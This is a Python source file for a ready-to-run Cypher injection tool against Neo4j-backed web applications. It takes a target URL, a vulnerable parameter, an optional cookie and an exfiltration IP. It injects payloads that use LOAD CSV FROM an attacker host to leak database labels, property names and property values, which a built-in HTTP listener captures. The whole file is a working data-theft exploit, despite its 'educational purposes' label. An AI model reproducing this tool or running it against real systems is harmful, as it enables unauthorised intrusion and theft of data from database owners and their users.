import argparse
import requests
import urllib.parse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the incoming GET request path (which could contain the data)
        print(f"Received data: {self.path}")
        # Send a basic HTTP response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    # Suppress console logging of the HTTP server
    def log_message(self, format, *args):
        return

def start_listener(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"Listening on port {port}...")
    httpd.serve_forever()


class Neo4jInjector:
    def __init__(self, target, exfil_ip, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = exfil_ip
        self.request_type = request_type
        self.parameters = parameters
        # Check if a cookie was provided and split it into a dictionary if so
        self.cookie = {cookie.split('=')[0]: cookie.split('=')[1]} if cookie else None
        self.headers = {
            'User-Agent': 'curl/8.5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
        }

    def inject_payload(self, payload):
        injection_characters = ["-1", "'", "\""]
        for injection_character in injection_characters:
            full_payload = injection_character + payload
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        if self.request_type == "API":
            url = self.target + self.parameters + encoded_payload
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        try:
            if self.request_type == "POST":
                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)
            else:
                response = requests.get(url, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)

            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Payload Injected")

        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

    def exfil_data(self):
        print("Dumping Labels")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
        label = input("Enter Label: ")

        print("Dumping Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")

        print("Dumping Value of Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")

def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
    parser.add_argument("-p", "--parameters", required=True, help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
    parser.add_argument("--listen-port", required=True, type=int, help="Port for the listener to capture incoming data")

    args = parser.parse_args()


    # Start the listener in a separate thread
    listener_thread = threading.Thread(target=start_listener, args=(args.listen_port,))
    listener_thread.daemon = True
    listener_thread.start()

    injector = Neo4jInjector(args.url, args.exfil_ip, args.type, args.parameters, args.cookie)

    # Begin exfiltration process
    injector.exfil_data()

if __name__ == "__main__":
    main()
